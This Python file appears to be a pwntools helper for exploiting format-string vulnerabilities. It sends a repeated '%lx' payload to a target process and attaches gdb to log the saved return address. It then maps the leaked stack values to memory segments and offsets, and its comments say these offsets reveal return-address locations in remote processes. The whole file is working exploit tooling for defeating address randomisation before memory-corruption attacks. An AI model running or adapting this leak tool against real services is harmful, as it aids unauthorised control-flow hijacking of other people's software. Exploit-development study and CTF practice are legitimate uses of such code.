from pwn import *
from prettytable import PrettyTable

class Leaked_obj:
    def __init__(self, index, value, offset):
        self.index = index
        self.value = value
        self.offset = offset

# Disgusting trick using gdb to get the return address
#
# Timeline:
#
# target        gdb         exploit
#
# trigger-----------------------|
# fgets wait                    V
#                 |---------attach gdb
#   .             V         sendline
#               b printf    recv wait
#   |-----------c
#   V                           .
# printf----------|             .
#                 V             .
#               log ret         .
#   |-----------detach          .
#   V
# write-------------------------|
#                               V
#                           read log
#
# I hope this ensures we are free from race conditions

def _comm(p):

    # wait for trigger
    if (V): print("Executing target until " + str(TRIGGER) + " is received.\n")
    recv_trigger = p.recvuntil(TRIGGER)
    if (V>1): print("TRIGGER :\n{0}\n".format(recv_trigger))

    examine = "x $ebp + 4" if ARCH == 'i386' else "x $rbp + 8"
    
    gdb.attach(p, exe=EXE, gdbscript= """
        b printf
        c
        set logging overwrite on
        set logging on
        """ + examine + """
        set logging off
        detach
        quit
        """)

    # injection
    # SIGSTART and SIGSTOP help to get the format string in case it is printed along with other strings
    payload = b"SIGSTART" + b".%lx"*(LEAKLEN) + b".SIGSTOP"
    p.sendline(payload)

    # response
    recv = p.recvline()
    while (b"SIGSTART." not in recv or b"SIGSTOP" not in recv):
        if (V>1): print(recv)
        recv = p.recvline()
    if (V>1): print("\nPRINTF :\n{0}\n".format(recv))

    # list of leaked values
    recv = recv.split(b"SIGSTART.")[-1].split(b".SIGSTOP")[0]
    recv = [ int(re.search(r'[0-9a-fA-F]+', x.decode('ascii')).group(), 16) for x in recv.split(b'.') ]

    with open("gdb.txt", "r") as log:
        try:
            ret = [int(x, 16) for x in log.read().split(":")] # address, value
        except ValueError:
            ret = -1

    return recv, ret



# Parses /proc/[target's pid]/maps, returns a dictionary of mapped addresses
def _maps(p):

    files_map = dict()                      # { *file's name* : [*start address*, *end address*] }
    current_file = ""                       # a machine state
    mfile = ""                              # file's name according to /proc/[pid]/maps
    start_address, end_address = 0, 0       # start and end addresses of segments or files

    path = "/proc/" + str(p.pid) + "/maps"

    if (V>1): print("\nMAPS :")
    with open(path, "r") as proc:
        for line in proc.readlines():
       
            line = line[:-1]
            if (V>1): print(line)

            mfile = re.split(r'/|\[', line)[-1]
            mfile = mfile[:-1] if mfile[-1] == ']' else mfile

            # no name
            if (mfile == line[:-1]):
                continue

            # file mapped to multiple segments
            if (mfile == current_file):
                end_address = int(re.split(r'-|\s', line)[1], 16)

            # first segment
            else:
                if (current_file != ""):
                    files_map[current_file].append(end_address)
                if (mfile in files_map):
                    print("ERROR: Same file mapped to multiple non consecutive segments or mapping of multiple files sharing the same name. Execution aborted.")
                    exit(0)
                current_file = mfile
                start_address = int(line.split('-')[0], 16)
                files_map[mfile] = [start_address]
                end_address = int(re.split(r'-|\s', line)[1], 16)
    
    if (V>1): print("\n", end="")

    # end address of last line
    files_map[current_file].append(end_address)

    return files_map



# Main function. Leaks a portion of the stack with printf(n*"%x.").
# For every value being a valid address, prints the name of the corresponding segment or file, along with it's offset.
# For values being stack addresses, prints their differences with the return address' address.
# If that difference is constant for multiple executions (probable), it allows calculation of the return address's address of remote processes.
#
# exe : executable's path
# trigger :         incoming string to wait for before sending our format string
# leaklen :         the length of the format string
# p (optional) :    a running instance of exe
# v (optional) :    verbosity level (0:no output, 1:+, >1:++)

def leak(exe, trigger, leaklen=0x30, p=None, v=1):

    global TRIGGER
    global EXE
    global ARCH
    global LEAKLEN
    global V

    V = v

    # tests that exe is a file, get it's architecture
    try:    
        ARCH = ELF(exe).get_machine_arch()
    except FileNotFoundError:
        print("target file not found :", exe)
        exit(0)
    if (ARCH != 'amd64' and ARCH != 'i386'):
        print("arch unknown :", ARCH + ". Assuming amd64.")
    EXE = exe

    # tests that trigger is in byte format
    if (isinstance(trigger, str)):
        TRIGGER = trigger.encode('utf-8')
    elif (isinstance(trigger, bytes)):
        TRIGGER = trigger
    else:
        print("second argument must be string or bytes. Got :", trigger)
        exit(0)

    # tests that leaklen is int
    try:
        LEAKLEN = int(leaklen)
    except ValueError:
        print("third argument must be integer. Got :", leaklen)
        exit(0)

    # tests that p is a started process. If not, starts it
    if (not isinstance(p, pwnlib.tubes.process.process)):
        p = process(EXE)

    # dictionary of mapped segments's start and end addresses
    files_map = _maps(p)

    # Communicates with target
    # [*leaked values*], [ [rbp+8 | ebp+4], *[rbp+8, | ebp+4] ] AT NEXT PRINTF REACHED
    recv, ret = _comm(p)
    if (ret == -1):
        print("Unable to locate return address.")
    else:
        ret_ad, ret_val = ret
  
    leaked = dict()
    t = PrettyTable(['index', 'value', 'segment', 'offset'])

    format_flag = False
    for i, val in enumerate(recv):

        if ("2e786c25" in hex(val) and not format_flag):   # "%lx."
            format_flag = True
            leaked["format start"] = i
            t.add_row([str(i), hex(val), "format start", "-"])

        for mapped in files_map:

            # value is a valid address
            if (files_map[mapped][0] <= val <= files_map[mapped][1]):

                # if it's a stack address, get it's difference with the return address's address
                if (mapped == "stack" and ret != -1):
                    offset = ret_ad - val
                    leaked.setdefault("stack", []).append(Leaked_obj(i, val, offset))
                    t.add_row([str(i), hex(val), "return address", hex(offset)])

                # otherwise, get it's offset from the start of the mapped file/segment
                else:
                    offset = val - files_map[mapped][0]
                    leaked.setdefault(mapped, []).append(Leaked_obj(i, val, offset))
                    t.add_row([str(i), hex(val), mapped, hex(offset)])

    if (V): print(t)
    return leaked
